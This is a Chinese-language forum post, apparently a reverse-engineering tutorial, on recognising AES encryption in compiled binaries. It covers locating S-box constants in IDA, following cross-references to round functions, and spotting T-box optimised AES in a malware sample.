![](https://bbs.pediy.com/upload/attach/202105/784955_Y7TABD7S2ZD5M2Q.jpg)

代码实现如下。

![](https://bbs.pediy.com/upload/attach/202105/784955_8YJHJ649VCPG2YE.jpg)

了解了 AES 标准加密算法的逻辑有助于我们更好的识别算法，因为我们可以从正向逻辑中得知 AES 存在 S 盒常量，在 SubBytes 阶段和轮密钥生成阶段均会使用。这也就是为什么我们识别算法时首先找 S 盒特征的原因。而且我们还了解到 AES 存在切块数据以及左移数据的操作等行为，当我们分析过程中如果遇到便可以提高警惕。

我们可以借助插件或者手动在 IDA 中搜索密钥的 S 盒位置，我们直接搜索标准的 S 盒值，便可以在 Github 编译的程序中找到 S 盒。

![](https://bbs.pediy.com/upload/attach/202105/784955_YEPHX57HH5DZDJC.jpg)

定位到 S 盒

![](https://bbs.pediy.com/upload/attach/202105/784955_GFS6RQ4CEUEQQHP.jpg)

对比数据一致

![](https://bbs.pediy.com/upload/attach/202105/784955_FY3G446WSUU346D.jpg)

然后根据交叉引用功能便可以找到 AddRoundKey 和 SubBytes 操作函数位置。

![](https://bbs.pediy.com/upload/attach/202105/784955_4F6C5GRX6G7RMUJ.jpg)

#### AES 算法优化

我们使用同样的方式在病毒样本中查找 S 盒，会发现并没有找到 AES 算法的 S 盒。但是使用 Findcrypt 插件却能识别出 AES，这很有可能是算法做了优化后的 AES。我们根据之前的算法解析可以知道 AES 一轮中一共有 4 个步骤。

![](https://bbs.pediy.com/upload/attach/202105/784955_X5RZZZKPZEMZ3AS.jpg)

原始加密轮顺序如下，其中 A 代表明文的单个字节

![](https://bbs.pediy.com/upload/attach/202105/784955_MA5MJ4KRQW52ZN4.jpg)

其中 SubBytes 和 ShiftRows 交换位置不会影响计算结果。

![](https://bbs.pediy.com/upload/attach/202105/784955_A7YT2WSSBW25C94.jpg)

而第三步 MixColumns 实际上是一个矩阵乘法，第四步 AddRoundKey 是个单纯的向量异或操作，所以作者往往有可能将 1、3、4 步直接运算成一个 4 矩阵表，这样就节省了中间步骤。于是就产生了所谓的 T 盒（用于查表），下图是第三步 MixColumns 的线代公式。其中 B 符号代表的矩阵是由 SubBytes 查表得来的。

[第五届安全开发者峰会（SDC 2021）议题征集正式开启！](https://bbs.pediy.com/thread-266645.htm)

最后于 1 天前 被独钓者 OW 编辑 ，原因：